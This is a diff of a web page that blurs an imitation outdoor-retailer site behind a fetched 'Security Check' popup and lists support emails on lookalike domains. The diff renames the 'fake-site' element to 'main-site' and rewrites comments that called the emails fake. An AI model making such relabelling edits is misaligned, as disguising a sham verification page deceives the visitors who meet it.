@@ -36,86 +36,86 @@ body {
 }
 
 /* ========== BLURRED BACKGROUND WEBSITE ========== */
-#fake-site {
+#main-site {
   position: fixed; inset: 0; z-index: 0;
   filter: blur(8px) brightness(0.9);
   pointer-events: none; user-select: none;
   overflow: hidden;
   transition: filter 0.5s ease;
 }
-#fake-site .nav {
+#main-site .nav {
   display: flex; align-items: center; justify-content: space-between;
   padding: 20px 48px;
   background: rgba(26,28,23,0.95);
   border-bottom: 1px solid rgba(200,164,78,0.2);
 }
-#fake-site .nav .logo {
+#main-site .nav .logo {
   font-family: 'Bitter', sans-serif;
   font-size: 24px; font-weight: 700; color: var(--white);
   letter-spacing: -0.5px;
 }
-#fake-site .nav .logo span { color: var(--accent); }
-#fake-site .nav-links { display: flex; gap: 32px; }
-#fake-site .nav-links a {
+#main-site .nav .logo span { color: var(--accent); }
+#main-site .nav-links { display: flex; gap: 32px; }
+#main-site .nav-links a {
   color: var(--muted); text-decoration: none; font-size: 14px; font-weight: 500;
 }
-#fake-site .hero {
+#main-site .hero {
   display: flex; flex-direction: column; align-items: center;
   text-align: center; padding: 100px 24px 60px;
   background: linear-gradient(180deg, var(--bg) 0%, #2a2d22 100%);
 }
-#fake-site .hero h1 {
+#main-site .hero h1 {
   font-family: 'Bitter', sans-serif;
   font-size: 56px; font-weight: 700; line-height: 1.1;
   max-width: 700px; color: var(--white);
   margin-bottom: 20px;
 }
-#fake-site .hero h1 em {
+#main-site .hero h1 em {
   font-style: normal;
   background: linear-gradient(135deg, var(--accent), #d4b85c);
   -webkit-background-clip: text; -webkit-text-fill-color: transparent;
 }
-#fake-site .hero p {
+#main-site .hero p {
   font-size: 18px; color: var(--muted); max-width: 520px; margin-bottom: 36px; line-height: 1.6;
 }
-#fake-site .hero .cta {
+#main-site .hero .cta {
   display: inline-block; padding: 14px 36px; border-radius: 10px;
   background: linear-gradient(135deg, var(--accent), #b8943e);
   color: #1a1c17; font-weight: 600; font-size: 16px;
   text-decoration: none; box-shadow: 0 4px 24px rgba(200,164,78,0.3);
 }
-#fake-site .features {
+#main-site .features {
   display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px;
   padding: 60px 48px; max-width: 1100px; margin: 0 auto;
 }
-#fake-site .feature-card {
+#main-site .feature-card {
   background: var(--card); border: 1px solid rgba(255,255,255,0.06);
   border-radius: 16px; padding: 32px;
 }
-#fake-site .feature-card .icon { font-size: 32px; margin-bottom: 16px; }
-#fake-site .feature-card h3 {
+#main-site .feature-card .icon { font-size: 32px; margin-bottom: 16px; }
+#main-site .feature-card h3 {
   font-family: 'Bitter', sans-serif;
   font-size: 20px; font-weight: 600; color: var(--white); margin-bottom: 10px;
 }
-#fake-site .feature-card p { font-size: 14px; color: var(--muted); line-height: 1.6; }
-#fake-site .testimonials {
+#main-site .feature-card p { font-size: 14px; color: var(--muted); line-height: 1.6; }
+#main-site .testimonials {
   padding: 60px 48px; text-align: center;
 }
-#fake-site .testimonials h2 {
+#main-site .testimonials h2 {
   font-family: 'Bitter', sans-serif;
   font-size: 36px; color: var(--white); margin-bottom: 40px;
 }
-#fake-site .testimonial-grid {
+#main-site .testimonial-grid {
   display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px;
   max-width: 1000px; margin: 0 auto;
 }
-#fake-site .testimonial {
+#main-site .testimonial {
   background: var(--card); border-radius: 12px; padding: 28px;
   border: 1px solid rgba(255,255,255,0.06); text-align: left;
 }
-#fake-site .testimonial p { font-size: 14px; color: var(--muted); line-height: 1.6; font-style: italic; margin-bottom: 14px; }
-#fake-site .testimonial .author { font-size: 13px; color: var(--accent); font-weight: 600; }
-#fake-site .footer-site {
+#main-site .testimonial p { font-size: 14px; color: var(--muted); line-height: 1.6; font-style: italic; margin-bottom: 14px; }
+#main-site .testimonial .author { font-size: 13px; color: var(--accent); font-weight: 600; }
+#main-site .footer-site {
   padding: 40px 48px; text-align: center;
   border-top: 1px solid rgba(255,255,255,0.06);
   color: var(--muted); font-size: 13px; margin-top: 40px;
@@ -377,16 +377,16 @@ body {
 /* ========== RESPONSIVE ========== */
 @media (max-width: 600px) {
   #popup { width: 95vw; }
-  #fake-site .hero h1 { font-size: 32px; }
-  #fake-site .features { grid-template-columns: 1fr; }
-  #fake-site .testimonial-grid { grid-template-columns: 1fr; }
+  #main-site .hero h1 { font-size: 32px; }
+  #main-site .features { grid-template-columns: 1fr; }
+  #main-site .testimonial-grid { grid-template-columns: 1fr; }
 }
 </style>
 </head>
 <body>
 
-<!-- ========== BLURRED BACKGROUND FAKE WEBSITE ========== -->
-<div id="fake-site">
+<!-- ========== MAIN SITE CONTENT ========== -->
+<div id="main-site">
   <div class="nav">
     <div class="logo">IRON<span>CREEK</span> OUTFITTERS</div>
     <div class="nav-links">
@@ -484,7 +484,7 @@ let recentTypes = [];
 let progress = 12;
 let currentPopup = null;
 
-// Fake support emails
+// Support contact rotation
 const supportEmails = [
   "support@ironcreek-verify.com",
   "security@ironcreekoutfitters.net",
@@ -528,7 +528,7 @@ function updateBlur() {
   if (failCount > 30) {
     const decrease = (failCount - 30) * 0.1;
     const blur = Math.max(3, 8 - decrease);
-    document.getElementById("fake-site").style.filter = `blur(${blur}px) brightness(0.9)`;
+    document.getElementById("main-site").style.filter = `blur(${blur}px) brightness(0.9)`;
   }
 }
 
@@ -544,7 +544,7 @@ async function fetchPopup() {
     return data;
   } catch (err) {
     console.error("Fetch error:", err);
-    // Fallback
+    // Default verification
     return {
       title: "Security Check",
       body: "Please complete this step to continue.",
